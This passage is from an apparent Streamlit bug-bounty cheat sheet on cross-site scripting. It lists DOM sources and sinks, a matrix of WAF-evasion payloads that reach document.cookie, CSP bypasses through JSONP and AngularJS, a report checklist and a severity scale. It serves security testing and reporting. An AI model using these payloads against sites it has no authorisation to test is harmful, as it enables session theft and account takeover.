| `location.hash` | `document.write()` | Reflected DOM XSS |
| `location.search` | `.innerHTML` | DOM manipulation |
| `document.referrer` | `eval()` | Code execution |
| `window.name` | `location.href=` | Open redirect → XSS |
| `postMessage` | `.innerHTML` | Cross-origin DOM XSS |
""")

    with tab2:
        st.markdown("""
### WAF Bypass Matrix

| Blocked | Bypass |
|---|---|
| `<script>` | `<ScRiPt>`, `<script\x0d>`, `<<script>` |
| `alert(` | `` alert`1` ``, `(alert)(1)`, `window['alert'](1)` |
| `onerror=` | `oNeRrOr=`, `onerror\x0b=` |
| `<img` | `<svg onload=`, `<details ontoggle=` |
| `document.cookie` | `document['cookie']`, `self['document']['cookie']` |
| Entity encoding | `&#x61;lert(1)` = `alert(1)` |
| String detection | `eval(atob('YWxlcnQoMSk='))` |
| Keyword filter | `top['al'+'ert'](1)` |

### CSP Bypass

| CSP Directive | Bypass |
|---|---|
| `unsafe-inline` | Direct `<script>` injection |
| CDN allowed | Load AngularJS → template injection |
| JSONP endpoint | `<script src="api/cb?cb=alert(1)">` |
| `nonce-xxx` | Find nonce in page → reuse |
| `strict-dynamic` | Inject via already-trusted script |
""")

    with tab3:
        st.markdown("""
### Report Quality Checklist

✅ Show `document.domain` or `document.cookie` in alert — not just `alert(1)`
✅ Record a video PoC before submitting
✅ State the exact context (HTML body, attribute, JS string)
✅ Include CVSS vector
✅ Describe realistic attack scenario (phishing link → session theft)
✅ Test in latest Chrome — don't rely on niche browsers
✅ If stored XSS → note who sees it (admin? other users?)
✅ If blind XSS → provide OOB proof
✅ Chain with other bugs if possible (XSS + CSRF = ATO)

### Severity Escalation

| Scenario | Severity |
|---|---|
| Reflected, self-only | Low |
| Reflected, URL-shareable | Medium |
| Reflected + cookie theft | Medium-High |
| Stored, user-facing | High |
| Stored, admin panel (blind) | Critical |
| DOM XSS + no CSP | High |
| XSS + CSRF chain = ATO | Critical |
""")
